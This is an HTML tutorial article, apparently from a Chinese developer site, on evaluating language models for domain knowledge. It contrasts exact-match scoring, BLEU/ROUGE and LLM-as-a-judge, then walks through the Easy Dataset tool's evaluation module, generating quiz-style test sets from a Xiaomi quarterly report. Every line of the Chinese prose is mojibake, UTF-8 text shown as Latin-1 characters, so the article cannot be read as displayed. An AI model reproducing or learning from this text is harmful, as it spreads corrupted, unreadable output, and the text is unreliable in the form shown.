<p>é€šç”¨æ¨¡å‹å¾€å¾€åœ¨å…¬å¼€äº’è”ç½‘è¯­æ–™ä¸Šè¡¨ç°è‰¯å¥½ï¼Œä½†å¯¹äºä¼ä¸šå†…éƒ¨æ–‡æ¡£ã€æœªå…¬å¼€çš„è¡Œä¸šè§„èŒƒç­‰â€œé•¿å°¾çŸ¥è¯†â€è¡¨ç°ä¸ä½³ï¼Œå¿…é¡»è¿›è¡Œä¸“é¡¹è¯„ä¼°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84026c8ee4e0426ba5e19741619e7124~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=EBPd5Wf%2FHmUhTzEnbY%2BWJYBTWzI%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œè¯„ä¼°æ¨¡å‹é€šå¸¸æ˜¯ä¸ºäº†è§£å†³ä¸‰ä¸ªå¾ˆå…·ä½“çš„é—®é¢˜ï¼š</p>
<ul>
<li>
<p><strong>é€‰å‹å¿ƒé‡Œæ²¡åº•ï¼š</strong>
å¼€æºæ¨¡å‹é‚£ä¹ˆå¤šï¼ˆQwen, DeepSeek, MiniMax...ï¼‰ï¼Œåœ¨æ²¡å¾®è°ƒä¹‹å‰ï¼Œè°å¯¹æˆ‘çš„ä¸šåŠ¡æ–‡æ¡£ç†è§£èƒ½åŠ›æ›´å¼ºï¼Ÿå¦‚æœä¸è·‘ä¸€éè‡ªå·±çš„æ•°æ®ï¼Œç›²é€‰å¾ˆå®¹æ˜“è¸©å‘ã€‚</p>
</li>
<li>
<p><strong>å¾®è°ƒæ•ˆæœéªŒè¯ï¼ˆSFTï¼‰ï¼š</strong>
ä½ èŠ±é’±èŠ±æ—¶é—´å¾®è°ƒäº†ä¸€ä¸ªæ¨¡å‹ï¼ŒLoss æ›²çº¿çœ‹ç€æŒºå¥½ï¼Œä½†æ¨¡å‹çœŸçš„å˜èªæ˜äº†å—ï¼Ÿè¿˜æ˜¯è¯´å®ƒåªæ˜¯è®°ä½äº†è®­ç»ƒé›†ï¼Ÿæ›´ç³Ÿç³•çš„æ˜¯ï¼Œå®ƒä¼šä¸ä¼šå­¦ä¼šäº†ä¸“ä¸šçŸ¥è¯†ï¼Œå´æŠŠé€šç”¨çš„å¯¹è¯èƒ½åŠ›æä¸¢äº†ï¼ˆç¾éš¾æ€§é—å¿˜ï¼‰ï¼Ÿè¿™éœ€è¦å¯¹æ¯”æµ‹è¯•æ‰çŸ¥é“ã€‚</p>
</li>
<li>
<p><strong>RAG ç³»ç»Ÿçš„â€œç”©é”…â€ä¾æ®ï¼š</strong>
åœ¨æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æ¶æ„ä¸­ï¼Œæ¨¡å‹æ˜¯å¦å‡†ç¡®åˆ©ç”¨äº†æ£€ç´¢åˆ°çš„ä¸Šä¸‹æ–‡ï¼Ÿæ˜¯å¦å­˜åœ¨å¹»è§‰ï¼Ÿè¿™éœ€è¦é’ˆå¯¹æ€§çš„è¯„ä¼°æŒ‡æ ‡ã€‚</p>
</li>
</ul>
<h3 data-id="heading-2">2. ä¸»æµçš„è¯„ä¼°æ–¹æ³•</h3>
<p>ä¼ ç»Ÿçš„å‚ç›´é¢†åŸŸè¯„ä¼°é€šå¸¸éœ€è¦ â€œæ‡‚è¡Œçš„äººâ€ æ¥é˜…å·ã€‚ä½†æ˜¯ï¼Œè¡Œä¸šä¸“å®¶çš„å·¥ä½œæ—¶é—´æ˜¯æå…¶æ˜‚è´µçš„ï¼Œå‡ åæ¡æ•°æ®è¿˜èƒ½çœ‹ï¼Œæˆåƒä¸Šä¸‡æ¡æ•°æ®é çº¯äººå·¥å°±ä¸å¤ªç°å®äº†ã€‚</p>
<p>è€Œä¸”äººçš„ä¸»è§‚æ ‡å‡†å˜åŠ¨å¾ˆå¤§ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªæ–‡æ¡ˆæ˜¯â€œå‡†ç¡®â€è¿˜æ˜¯â€œç”ŸåŠ¨â€ï¼Ÿè¿™ç§ä¸»è§‚æ€§ä¼šå¯¼è‡´è¯„ä¼°ç»“æœæ³¢åŠ¨å¤§ï¼Œéš¾ä»¥ä½œä¸ºæ¨¡å‹å¯¹æ¯”çš„ç¡¬æŒ‡æ ‡ã€‚</p>
<p>åœ¨çœŸå®çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæ¨¡å‹åœ¨ç‰¹å®šé¢†åŸŸè¡¨ç°çš„è¯„ä¼°é€šå¸¸é ä»¥ä¸‹å‡ ç±»è¯„ä¼°æ–¹æ³•ï¼š</p>
<h4 data-id="heading-3">æ–¹æ¡ˆä¸€ï¼šç¡®å®šæ€§è¯„ä¼°</h4>
<p>æ ‡å‡†ç­”æ¡ˆå’Œæ¨¡å‹å›ç­”çš„å®Œå…¨åŒ¹é…æ˜¯æœ€ç›´æ¥ã€æˆæœ¬æœ€ä½çš„æ–¹å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7de01379e7b546968b719cee7290a5a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=3QdSqpHJSuGqgYafLeWuGKLy41g%3D" alt="" loading="lazy"/></p>
<p>è¿™ç±»è¯„ä¼°åªèƒ½é™åˆ¶åœ¨æŸäº›ç‰¹å®šçš„é¢˜ç›®ç±»å‹ä¸Šï¼Œå°±åƒæˆ‘ä»¬åœ¨è€ƒè¯•çš„æ—¶å€™åšçš„åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€‚</p>
<p>å®ƒä»¬çš„ç­”æ¡ˆæ˜¯å›ºå®šçš„ï¼Œéé»‘å³ç™½ï¼Œæ˜¯å¦å¾—åˆ†è¿˜æ˜¯å¾ˆå¥½è¯„ä¼°çš„ã€‚</p>
<p>ä½†æ˜¯ï¼Œæ­¤ç±»æ•°æ®é›†çš„åˆ¶å®šè¿˜æ˜¯æœ‰ä¸€å®šæˆæœ¬çš„ï¼Œé€šç”¨è¯„ä¼°é›†ï¼ˆå¦‚ MMLUï¼‰æ¶µç›–é¢å¹¿ä½†æ·±åº¦ä¸è¶³ã€‚é’ˆå¯¹ç‰¹å®šä¸šåŠ¡çš„ã€åŒ…å«æ ‡å‡†ç­”æ¡ˆçš„é«˜è´¨é‡é¢˜åº“éå¸¸ç¨€ç¼ºï¼Œå¾€å¾€éœ€è¦èµ„æ·±ä¸“å®¶æ‰‹å·¥ç¼–å†™ï¼Œæ•ˆç‡æä½ã€‚</p>
<h4 data-id="heading-4">æ–¹æ¡ˆäºŒï¼šåŸºäºç»Ÿè®¡çš„æ–‡æœ¬ç›¸ä¼¼åº¦</h4>
<p>æ¯”å¦‚æˆ‘ä»¬ç»å¸¸å¬åˆ°çš„ <code>BLEU</code>ã€<code>ROUGE</code>ã€<code>METEOR</code> è¿™äº›æŒ‡æ ‡æ˜¯è‡ªç„¶è¯­è¨€å¤„ç†ï¼ˆNLPï¼‰é¢†åŸŸæœ€å¸¸ç”¨çš„è‡ªåŠ¨æ–‡æœ¬ç”Ÿæˆè¯„ä¼°æŒ‡æ ‡ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯é‡åŒ–æœºå™¨ç”Ÿæˆæ–‡æœ¬ï¼ˆå¦‚ç¿»è¯‘ã€æ‘˜è¦ã€å¯¹è¯å›å¤ï¼‰ä¸äººå·¥æ ‡æ³¨çš„å‚è€ƒæ–‡æœ¬ä¹‹é—´çš„ç›¸ä¼¼åº¦ï¼Œåˆ¤æ–­ç”Ÿæˆç»“æœçš„è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51db7177823d45b0a02541728013814c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=kC4vu%2BGUp6bYI86CgS9oGbsMtUg%3D" alt="" loading="lazy"/></p>
<p>è¿™ç±»æŒ‡æ ‡è®¡ç®—çš„æœ¬è´¨ä¸Šéƒ½æ˜¯ç”Ÿæˆæ–‡æœ¬ä¸å‚è€ƒæ–‡æœ¬çš„è¯æ±‡é‡å åº¦ã€‚åœ¨ LLM æ—¶ä»£ï¼Œæ„æ€ç›¸åŒä½†è¡¨è¾¾æ–¹å¼ä¸åŒçš„æƒ…å†µæ˜¯éå¸¸æ™®éçš„ï¼ˆæ ‡å‡†ç­”æ¡ˆæ˜¯ â€œåˆ©ç‡ä¸Šè°ƒâ€ï¼Œæ¨¡å‹å›ç­” â€œåŠ æ¯â€ã€‚å­—é¢ä¸Šæ²¡é‡åˆï¼Œå¾—åˆ†å¾ˆä½ï¼Œä½†æ„æ€å®Œå…¨ä¸€æ ·ã€‚ï¼‰ï¼Œæ‰€ä»¥å‚è€ƒä»·å€¼ä¸å¤§äº†ã€‚</p>
<p>åœ¨å‚ç›´é¢†åŸŸçŸ¥è¯†è¯„ä¼°ä¸­ï¼Œè¿™ç±»æŒ‡æ ‡çš„æƒé‡æ­£åœ¨è¢«å¤§å¹…é™ä½ï¼Œå› ä¸ºå®ƒä»¬å¾ˆå®¹æ˜“è¯¯æ€å¥½æ¨¡å‹ã€‚</p>
<h4 data-id="heading-5">æ–¹æ¡ˆä¸‰ï¼šåŸºäºæ¨¡å‹çš„è¯­ä¹‰è¯„ä¼°</h4>
<p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸ŠæœŸæ•™ç¨‹ä¸­æåˆ°çš„ <code>LLM as a Judge</code>ã€‚</p>
<p>è¿™æ˜¯ç›®å‰æå¼€æ”¾å¼é—®ç­”çš„æœ€ä¼˜è§£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0321e2150ece4d14adc588feb6a9bf0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=em%2FNcB21L%2FUXEALvFwE9RIp2tu4%3D" alt="" loading="lazy"/></p>
<p>æ ¸å¿ƒé€»è¾‘ï¼šç”¨ä¸€ä¸ªæ›´å¼ºã€æ›´èªæ˜çš„æ¨¡å‹ï¼ˆæ¯”å¦‚ <code>GPT-5</code>ï¼‰å½“è£åˆ¤ï¼Œå»ç»™ä¸šåŠ¡æ¨¡å‹ï¼ˆæ¯”å¦‚ <code>Qwen3-7B</code> çš„å°æ¨¡å‹ï¼‰æ‰“åˆ†ã€‚</p>
<p>æ­¤ç±»è¯„ä¼°çš„å…³é”®ä¸åœ¨æµç¨‹ï¼Œè€Œæ˜¯è¯„åˆ†ç»†åˆ™ï¼ˆPromptï¼‰ï¼Œä¸åŒç±»å‹çš„æ•°æ®é›†é€šå¸¸éœ€è¦åˆ¶å®šç‰¹å®šçš„è¯„ä¼°æ ‡å‡†ã€‚</p>
<h3 data-id="heading-6">3. çœŸå®å·¥ä½œä¸­é¢ä¸´çš„ç—›ç‚¹</h3>
<p>åœ¨çœŸå®çš„è¯„ä¼°å·¥ä½œä¸­ï¼Œæˆ‘ä»¬å¾€å¾€é¢ä¸´ç€ä»¥ä¸‹ç—›ç‚¹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a07537b47624439a38612a0b6d689d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=GdOHQ1UlNgcM0X8H%2Bl0USGEOA3Y%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p>æµ‹è¯•é›†éš¾æ„é€ ï¼šå’Œæ¨¡å‹å¾®è°ƒè®­ç»ƒé¢ä¸´çš„é—®é¢˜ä¸€æ ·ï¼Œä¼ä¸šé‡Œæœ‰æµ·é‡çš„ PDF æ‰‹å†Œã€Markdown æŠ€æœ¯æ–‡æ¡£ï¼Œä½†æ²¡æœ‰ç°æˆçš„ QA å¯¹ï¼ˆé—®ç­”å¯¹ï¼‰ã€‚è¦è¯„ä¼°æ¨¡å‹ï¼Œé¦–å…ˆå¾—æŠŠéç»“æ„åŒ–çš„æ–‡æ¡£å˜æˆç»“æ„åŒ–çš„æµ‹è¯•é›†ã€‚</p>
</li>
<li>
<p>å®šæ€§å®¹æ˜“ï¼Œå®šé‡éš¾ï¼šå¤§å®¶å¸¸è¯´â€œè¿™ä¸ªæ¨¡å‹æ„Ÿè§‰æ¯”é‚£ä¸ªå¥½â€ã€‚ä½†åœ¨å·¥ç¨‹ä¸Šï¼Œâ€œæ„Ÿè§‰â€æ˜¯ä¸å€¼é’±çš„ã€‚æˆ‘ä»¬éœ€è¦å…·ä½“çš„æŒ‡æ ‡ â€” æ˜¯å¬å›ç‡æå‡äº†ï¼Ÿè¿˜æ˜¯å¹»è§‰ç‡ä¸‹é™äº†ï¼Ÿæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€å¥—å¯é‡åŒ–çš„æŒ‡æ ‡ï¼Œå¹¶ä¸”å¯ä»¥ç›´è§‚çš„è§‚æµ‹ã€‚</p>
</li>
<li>
<p>è‡ªåŠ¨åŒ–ä¸äººå·¥çš„å‰²è£‚ï¼šå®Œå…¨é äººå·¥æµ‹ï¼Œæµ‹ä¸åŠ¨ï¼›å®Œå…¨é è„šæœ¬æµ‹ï¼Œä¸å‡†ï¼ˆå°¤å…¶æ˜¯é•¿æ–‡æœ¬ç”Ÿæˆï¼‰ã€‚å¦‚ä½•æŠŠ â€œè‡ªåŠ¨åŒ–çš„è§„æ¨¡â€ å’Œ â€œäººå·¥çš„ç²¾å‡†â€ ç»“åˆèµ·æ¥ï¼Œæ˜¯ä¸€ä¸ªæ™®éæ€§éš¾é¢˜ã€‚</p>
</li>
</ul>
<h2 data-id="heading-7">ç¬¬äºŒéƒ¨åˆ†ï¼šå®æˆ˜ç¯‡</h2>
<p>åœ¨å®æˆ˜ç« èŠ‚ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€æ¬¾å·¥å…·ï¼ˆ<code>Easy Dataset</code>ï¼‰è§£å†³ä»¥ä¸Šç—›ç‚¹ã€‚</p>
<blockquote>
<p>Easy Dataset æ˜¯ä¸€ä¸ªä¸“ä¸ºåˆ›å»ºå¤§å‹è¯­è¨€æ¨¡å‹æ•°æ®é›†è€Œè®¾è®¡çš„åº”ç”¨ç¨‹åºã€‚é€šè¿‡ Easy Datasetï¼Œä½ å¯ä»¥å°†é¢†åŸŸçŸ¥è¯†è½¬åŒ–ä¸ºç»“æ„åŒ–æ•°æ®é›†ï¼Œå…¼å®¹æ‰€æœ‰éµå¾ª OpenAI æ ¼å¼çš„ LLM APIï¼Œä½¿æ•°æ®é›†æ„é€ è¿‡ç¨‹å˜å¾—ç®€å•é«˜æ•ˆï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FConardLi%2Feasy-dataset%2F" target="_blank" title="https://github.com/ConardLi/easy-dataset/" ref="nofollow noopener noreferrer">github.com/ConardLi/eaâ€¦</a></p>
</blockquote>
<p>åœ¨ï¼Œ<code>Easy Dataset</code> çš„ 1.7.0 ç‰ˆæœ¬ï¼Œæ”¯æŒäº†å…¨æ–°çš„ â€œè¯„ä¼°â€ æ¨¡å—ï¼Œèƒ½å¤Ÿåšåˆ° <strong>è‡ªåŠ¨åŒ–ç”Ÿæˆæµ‹è¯•é›†</strong> + <strong>ä½æˆæœ¬çš„åˆ›å»ºè¯„ä¼°ä»»åŠ¡</strong> + <strong>å¯è§†åŒ–çš„è¯„ä¼°ç»“æœ</strong>ã€‚</p>
<h3 data-id="heading-8">1.è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ç”Ÿæˆ</h3>
<blockquote>
<p><strong>è¯„ä¼°æ•°æ®é›†æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰æ˜¯ä¸€ç»„â€œé¢˜ç›® + æ ‡å‡†ç­”æ¡ˆ/å‚è€ƒç­”æ¡ˆ + è¯„åˆ†è§„åˆ™/é€‰é¡¹â€çš„é›†åˆã€‚ä½ å¯ä»¥ç”¨å®ƒæ¥ï¼šåšä¸åŒæ¨¡å‹çš„å¯¹æ¯”è¯„ä¼°ï¼Œé•¿æœŸè¿½è¸ªæ•ˆæœå˜åŒ–ã€‚</li>
</ul>
</blockquote>
<h4 data-id="heading-9">é¢˜ç›®ç±»å‹</h4>
<p>ä¸€ä¸ªå¥½çš„æ¨¡å‹è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰æ˜¯è¡¡é‡æ¨¡å‹çœŸå®èƒ½åŠ›çš„åŸºçŸ³ã€‚åœ¨ <code>Easy Dataset</code> ä¸­ï¼Œè¯„ä¼°é›†ä¸ä»…ä»…æ˜¯é—®é¢˜çš„é›†åˆï¼Œæ›´æ˜¯åŒ…å«æ ‡å‡†ç­”æ¡ˆã€è€ƒç‚¹æ ‡ç­¾å’Œä¸šåŠ¡é€»è¾‘çš„ç»¼åˆçŸ¥è¯†åº“ã€‚</p>
<p>ä¸ºäº†å…¨é¢è€ƒå¯Ÿæ¨¡å‹èƒ½åŠ›ï¼Œæˆ‘ä»¬è®¾è®¡äº†äº”ç§é¢˜å‹ï¼š</p>
<ul>
<li><strong>åˆ¤æ–­é¢˜ï¼š</strong>
è¿™æ˜¯æœ€ç›´æ¥çš„ã€‚è€ƒå¯Ÿæ¨¡å‹å¯¹æ ¸å¿ƒäº‹å®æ˜¯å¦ææ··ã€‚æ¯”å¦‚æ–‡æ¡£é‡Œè¯´â€œæ¸©åº¦ä¸èƒ½è¶…è¿‡ 100 åº¦â€ï¼Œé¢˜ç›®é—®â€œæ¸©åº¦æ˜¯å¦å¯ä»¥è¾¾åˆ° 105 åº¦ï¼Ÿâ€ï¼Œèƒ½æœ‰æ•ˆæ£€æµ‹å¹»è§‰ã€‚</li>
<li><strong>å•é€‰é¢˜ï¼š</strong>
4ä¸ªé€‰é¡¹ï¼ˆA-Dï¼‰ï¼Œå•é€‰ç­”æ¡ˆ | è€ƒå¯Ÿæ¨¡å‹åœ¨å¹²æ‰°é¡¹ä¸‹çš„çŸ¥è¯†æå–å’Œè¾¨æèƒ½åŠ›ã€‚</li>
<li><strong>å¤šé€‰é¢˜ï¼š</strong>
å¤šä¸ªé€‰é¡¹ï¼Œç­”æ¡ˆä¸ºå­—æ¯æ•°ç»„ï¼ˆå¦‚ <code>["A", "C"]</code>ï¼‰ | æå…·æŒ‘æˆ˜æ€§ï¼Œæ¼æ‰ä¸€ä¸ªä¿¡æ¯ç‚¹å°±é€‰ä¸å¯¹ã€‚</li>
<li><strong>ç®€ç­”é¢˜ï¼ˆçŸ­ç­”æ¡ˆï¼‰ï¼š</strong>
æä¾›æ ‡å‡†çŸ­ç­”æ¡ˆï¼ˆ20å­—ä»¥å†…ï¼‰ï¼Œå¯æµ‹è¯•æ¨¡å‹è·å–æ ¸å¿ƒçŸ¥è¯†ç‚¹å¹¶ç²¾ç®€è¡¨è¾¾çš„èƒ½åŠ›ã€‚å¦‚ï¼š2025 å¹´ç¾å›¢çš„è¥æ”¶æ˜¯å¤šå°‘äº¿ï¼Ÿ</li>
<li><strong>å¼€æ”¾é¢˜ï¼ˆé•¿ç­”æ¡ˆï¼‰ï¼š</strong>
è€ƒå¯Ÿæ¨ç†å’Œæ€»ç»“èƒ½åŠ›ã€‚æ¯”å¦‚â€œæ ¹æ®æ–‡æ¡£æè¿°ï¼Œåˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå‡ºç°è®¾å¤‡å¼‚å“ï¼Ÿâ€ã€‚è¿™ç§é¢˜æ²¡æœ‰æ ‡å‡†æ­»ç­”æ¡ˆï¼Œæœ€è€ƒéªŒæ¨¡å‹çš„é€»è¾‘ã€‚</li>
</ul>
<p>å¹¶ä¸”ï¼Œåœ¨ä»»åŠ¡é…ç½®ä¸­ <strong>æ”¯æŒé…ç½®å„é¢˜ç›®ç±»å‹ç”Ÿæˆçš„æ¯”ä¾‹</strong>ï¼ˆæ¯”å¦‚ï¼šæˆ‘è¦ 30% çš„åˆ¤æ–­é¢˜ç”¨äºæµ‹å¹»è§‰ï¼Œ70% çš„ç®€ç­”é¢˜æµ‹ç†è§£ï¼‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4caf47bc3d2d454c929f79a566ace467~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=iY%2Bvke5A8lT%2BeKtDKe8lY8Rp2ms%3D" alt="" loading="lazy"/></p>
<p>åœ¨ <code>Easy Dataset</code> ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼ç”Ÿæˆå’Œé…ç½®è¯„ä¼°æ•°æ®é›†ï¼ˆæµ‹è¯•é›†ï¼‰ï¼š</p>
<ul>
<li>ä»é¢†åŸŸæ–‡çŒ®ä¸­æå–æµ‹è¯•é›†</li>
<li>ä»è®­ç»ƒé›†æ·»åŠ æˆ–ç”Ÿæˆæµ‹è¯•é›†å˜ä½“</li>
<li>å¯¼å…¥è‡ªå®šä¹‰/å¹³å°å†…ç½®æµ‹è¯•é›†</li>
</ul>
<h4 data-id="heading-10">ä»é¢†åŸŸæ–‡çŒ®ç”Ÿæˆæµ‹è¯•é›†</h4>
<p>ä¸ç®¡æ˜¯ PDF è¿˜æ˜¯ Docx æ ¼å¼çš„é¢†åŸŸæ–‡çŒ®ï¼Œç³»ç»Ÿæ”¯æŒç›´æ¥å¯¼å…¥ã€‚åå°ä¼šæŠŠè¿™äº›é•¿æ–‡æœ¬åˆ‡åˆ†æˆå°å—ï¼ˆChunkï¼‰ï¼Œç„¶åé€šè¿‡æç¤ºè¯å·¥ç¨‹ï¼Œè®©å¤§æ¨¡å‹åŸºäºè¿™äº›æ–‡æœ¬å—è‡ªåŠ¨ç”Ÿæˆé¢˜ç›®ã€‚</p>
<p>æˆ‘ä»¬é¦–å…ˆæ¥åˆ°ã€æ•°æ®æº-æ–‡çŒ®å¤„ç†ã€‘æ¨¡å—ï¼Œå¯¼å…¥ä¸€ä»½å°ç±³ 2025 Q3 å­£åº¦çš„è´¢æŠ¥æ–‡æ¡£ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90562dd550c84b85a6946ee78125c6a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=AHYf6ZDksSDmAsYuMGGsMKcrW7s%3D" alt="" loading="lazy"/></p>
<p>ç³»ç»Ÿè§£æå®Œæˆåï¼Œä¼šå¯¹æ–‡æ¡£è¿›è¡Œè‡ªåŠ¨åˆ‡å—ï¼Œä¸ºäº†ä¿è¯åç»­åœ¨æ–‡æœ¬å—ä¸Šç”Ÿæˆçš„æµ‹è¯•é›†æ›´ç¬¦åˆä¸»é¢˜ï¼Œæˆ‘ä»¬æ‰¹é‡ç¼–è¾‘æ–‡æœ¬å—ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54c9e8ffb19348699b70cf9756b0b38c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7ZrydmqV2xzrV1C%2Bz%2Bv9Szjq0qg%3D" alt="" loading="lazy"/></p>
<p>åœ¨æ¯ä¸ªæ–‡æœ¬å—çš„å¼€å¤´å¢åŠ å…¨å±€æ‘˜è¦ä¿¡æ¯ï¼š</p>
<blockquote>
<p>å…¨å±€æ‘˜è¦ï¼šå½“å‰æ–‡æœ¬ä¸º <strong>å°ç±³é›†å›¢</strong> 2025 Q3 å­£åº¦çš„è´¢æŠ¥æ–‡æ¡£çš„ä¸€éƒ¨åˆ†ã€‚</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab2aec2441f84ee2ab986481394a84bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=zI4XAXtW9Zf3nABmDArQ3kwJ9J0%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©åŸºäºå•ä¸ªæ–‡æœ¬å—ç”Ÿæˆæµ‹è¯•é›†ï¼Œæˆ–è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•é›†ï¼ˆåå°è‡ªåŠ¨è¯»å–å¹¶å¤„ç†æœªç”Ÿæˆæµ‹è¯•é›†çš„æ–‡æœ¬å—ï¼‰ï¼Œç³»ç»Ÿå°†æ ¹æ®æˆ‘ä»¬å‰é¢åœ¨é¡¹ç›®è®¾ç½®ä¸­è®¾ç½®çš„å‡ ç§é¢˜ç›®ç±»å‹çš„æ¯”ä¾‹è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•é¢˜ç›®ï¼ˆé»˜è®¤çš„é¢˜ç›®ç±»å‹åˆ¤æ–­é¢˜ã€å•é€‰é¢˜ã€å¤šé€‰é¢˜ã€ç®€ç­”é¢˜ã€å¼€æ”¾é¢˜ä¸º <code>1:1:1:1:1</code>ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bfe29455c2f482faf2aa9c72960257e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=38O7Sa%2FwAIk7XMvdO49GQL8cszM%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>å»ºè®®ï¼š</p>
<ul>
<li>å…ˆç”¨ â€œå•ä¸ªç”Ÿæˆâ€ è·‘é€šæµç¨‹ï¼Œç¡®è®¤é¢˜å‹è´¨é‡ä¸æœŸæœ›ä¸€è‡´ï¼Œåœ¨æ‰§è¡Œè‡ªåŠ¨ç”Ÿæˆä»»åŠ¡ã€‚</li>
<li>æ¯”ä¾‹é…ç½®å…ˆä»ä¿å®ˆå¼€å§‹ï¼šå¼€æ”¾é¢˜æ¯”ä¾‹ä¸è¦å¤ªé«˜ï¼ˆåç»­æ•™å¸ˆæ¨¡å‹è¯„ä¼°æˆæœ¬æ›´é«˜ï¼‰</li>
</ul>
</blockquote>
<h4 data-id="heading-11">æµ‹è¯•é¢˜ç®¡ç†</h4>
<p>ç‚¹å‡»æ¯ä¸ªæ–‡æœ¬å—ä¸Šçš„ <strong>å·²ç”Ÿæˆæµ‹è¯•é¢˜</strong> æ ‡ç­¾ï¼Œæˆ‘ä»¬å°†è·³è½¬è‡³ã€è¯„ä¼°-è¯„ä¼°æ•°æ®é›†ã€‘æ¨¡å—ï¼Œåœ¨è¿™é‡Œä½ å¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆçš„æ‰€æœ‰æ•°æ®é›†ï¼Œä½ å¯ä»¥æ ¹æ®é¢˜ç›®ç±»å‹ã€é¢˜ç›®å†…å®¹å’Œæ ‡ç­¾è¿›è¡Œç­›é€‰ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47463c166c3e4f2e98f879ccaa8a9c01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=DGPOrlZm1l27TydSuV5UjqedZOo%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»å•ä¸ªé¢˜ç›®ï¼Œå¯ä»¥æŸ¥çœ‹é¢˜ç›®è¯¦æƒ…ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54881f7c153e48798b7af126dc9d1a80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=cgH9SPYF5gQ3u6lQeZPB8h1EEp8%3D" alt="" loading="lazy"/></p>
